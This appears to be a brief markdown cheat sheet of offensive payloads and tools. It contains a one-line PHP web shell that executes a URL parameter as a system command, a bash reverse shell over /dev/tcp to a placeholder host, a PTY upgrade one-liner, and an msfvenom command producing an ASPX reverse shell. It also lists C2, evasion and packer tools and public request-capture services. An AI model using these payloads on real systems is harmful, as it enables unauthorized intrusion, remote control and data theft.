# Payload

## Payload

### Browser Exploitation
- BeEF

### Backdoor
- Simple Backdoor

    - PHP

        ```php
        <?php
        SYSTEM($_GET['c']);
        ?>
        ```

- weevely

### Reverse Shell

- Bash Built-in TCP/UDP Client

    > Enable PTY
    >
    > python3 -c 'import pty;pty.spawn("/bin/bash")'

    ```bash
    bash -c "/bin/bash -i >& /dev/tcp/${HOST}/${PORT} 0<&1"
    ```

- [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
- msfvenom

    ```
    msfvenom --list payloads
    msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o reverse.aspx LHOST=${host} LPORT=1337
    ```

### Command & Control (C2)
- cobaltstrike

## Obfuscation

### Evasion 
- veil

### Packer
- UPX
- Themida


## Public Temp Server
- webhook.site
    - unique URL (https / CORS)
    - unique email
- beeceptor
- hookbin.com
- requestbin.net
